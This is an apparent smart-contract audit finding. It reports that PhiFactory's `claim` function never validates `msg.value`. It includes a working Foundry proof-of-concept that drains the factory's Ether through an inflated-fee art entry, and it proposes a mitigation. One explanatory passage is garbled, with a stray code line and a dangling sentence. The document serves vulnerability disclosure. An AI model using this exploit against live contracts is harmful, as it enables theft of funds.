# Vulnerability details

The `claim` function can be invoked by an arbitrary user. After some validation the function transfers control along 
with a fee payment to either `merkleClaim` or `signatureClaim`. However, the function does not check if `msg.value`
provided is enough to pay the fees. A naive attacker can just skip paying fees at the contract's expense. However,
an attacker can go much further and steal all Ether from the PhiFactory contract with the help of a specially crafted art entry.

As could be seen in the [code below](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L264-L304), 
the `claim` function does Ether transfers but never checks `msg.value`!

```solidity
    function claim(bytes calldata encodeData_) external payable {
        bytes memory encodedata_ = LibZip.cdDecompress(encodeData_);
        (uint256 artId) = abi.decode(encodedata_, (uint256));
        PhiArt storage art = arts[artId];
        uint256 tokenId = IPhiNFT1155Ownable(art.artAddress).getTokenIdFromFactoryArtId(artId);
        if (art.verificationType.eq("MERKLE")) {
            (
                ,
                address minter_,
                bytes32[] memory proof,
                address ref_,
                uint256 quantity_,
                bytes32 leafPart_,
                string memory imageURI_
            ) = abi.decode(encodedata_, (uint256, address, bytes32[], address, uint256, bytes32, string));

            bytes memory claimData = abi.encode(minter_, ref_, artId);
            MintArgs memory mintArgs = MintArgs({ tokenId: tokenId, quantity: quantity_, imageURI: imageURI_ });
            uint256 mintFee = getArtMintFee(artId, quantity_);
            this.merkleClaim{ value: mintFee }(proof, claimData, mintArgs, leafPart_);
        } else if (art.verificationType.eq("SIGNATURE")) {
            (
                ,
                address minter_,
                address ref_,
                address verifier_,
                uint256 expiresIn_,
                uint256 quantity_,
                bytes32 data_,
                string memory imageURI_,
                bytes memory signature_
            ) = abi.decode(encodedata_, (uint256, address, address, address, uint256, uint256, bytes32, string, bytes));

            bytes memory claimData = abi.encode(expiresIn_, minter_, ref_, verifier_, artId, block.chainid, data_);
            MintArgs memory mintArgs = MintArgs({ tokenId: tokenId, quantity: quantity_, imageURI: imageURI_ });
            uint256 mintFee = getArtMintFee(artId, quantity_);
            this.signatureClaim{ value: mintFee }(signature_, claimData, mintArgs);
        } else {
            revert InvalidVerificationType();
        }
    }
```

The attacker can create an art usual in all aspects but having the mint fee a couple of orders of magnitude bigger than
other typical fees. It seems that 0.1 ether fee would be quite enough. After the art is created, the attacker provides 
no Ether, but claims just enough to drain the factory balance.

For example, 

[the `claim`](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L264) calls

```solidity
            artId_, credId, quantity_, mintFee(tokenId_), addressesData_, credChainId == block.chainid

```
[handleRewardsAndGetValueSent of the PhiRewards contract](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/art/PhiNFT1155.sol#L186) which deposits an inflated fee to the `receiver` of the art, i.e. the attacker in our case:



to receive the lion's share of PhiFactory Ether balance.

## Impact

The vulnerability allows an attacker to steal any funds found on the factory balance. The amount at risk is 
expected to be quite limited compared to the `Cred` draining case. However, [the code](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L786-L788)
suggests that some funds may be found on the factory balance from time to time. Another issue illustrates how 
exactly funds may get stuck on the factory balance.

## Proof of Concept

Please insert the following code into `test/PhiFactory.t.sol` and run with `forge test --match-test testFactoryDraining -vv`:

```solidity
    function testFactoryDraining() public {
        vm.deal(address(phiFactory), 10 ether);

        address attacker = makeAddr(("attacker"));
        vm.deal(attacker, 0.1 ether);
        vm.startPrank(attacker);

        // Create an art.
        uint256 artId = phiFactory.artIdCounter();
        {
            bytes memory credData = abi.encode(1, owner, "SIGNATURE", 31_337, bytes32(0));
            bytes memory signCreateData = abi.encode(expiresIn, ART_ID_URL_STRING, credData);
            bytes32 createMsgHash = keccak256(signCreateData);
            bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
            (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
            if (cv != 27) cs = cs | bytes32(uint256(1) << 255);

            IPhiFactory.CreateConfig memory config =
                IPhiFactory.CreateConfig(artCreator, attacker, END_TIME, START_TIME, MAX_SUPPLY,
                    // A bit of a trick here is to set the mint fee quite bigger than other fees, but not too big
                    // to avoid extra scrutiny.
                    0.1 ether,
                    false);
            phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config);
        }

        // Claim enough to drain the factory balance, with zero value paid.
        bytes memory signature;
        {
            bytes memory signData =
                abi.encode(expiresIn, participant, referrer, verifier, artId, block.chainid, bytes32("1"));
            bytes32 msgHash = keccak256(signData);
            bytes32 digest = ECDSA.toEthSignedMessageHash(msgHash);
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
            if (v != 27) s = s | bytes32(uint256(1) << 255);
            signature = abi.encodePacked(r, s);
        }
        bytes memory data =
            abi.encode(artId, participant, referrer, verifier, expiresIn,
                // Quantity: just enough to grab all funds
                address(phiFactory).balance / phiFactory.getArtMintFee(artId, 1),
                bytes32("1"), IMAGE_URL, signature);
        bytes memory dataCompressed = LibZip.cdCompress(data);

        phiFactory.claim{ value: 0 /* ! */ }(dataCompressed);

        // To sum up...
        phiRewards.withdraw(attacker, 0);
        uint factoryLosses = 10 ether - address(phiFactory).balance;
        uint attackerGains = attacker.balance - 0.1 ether;

        console2.log("Factory lost: ", factoryLosses * 100 / 10 ether, "% of its balance");
        assert(factoryLosses > 9 ether);
        console2.log("Attacker gained: ", attackerGains / 0.1 ether, "times his initial balance");
        assert(attackerGains > 9 ether);
    }
```

## Recommended Mitigation Steps

Add `msg.value` validation to `claim` here:

```solidity
+           if (msg.value != mintFee) revert InvalidMintFee();
            this.merkleClaim{ value: mintFee }(proof, claimData, mintArgs, leafPart_);
```

and here:

```solidity
+           if (msg.value != mintFee) revert InvalidMintFee();
            this.signatureClaim{ value: mintFee }(signature_, claimData, mintArgs);
```
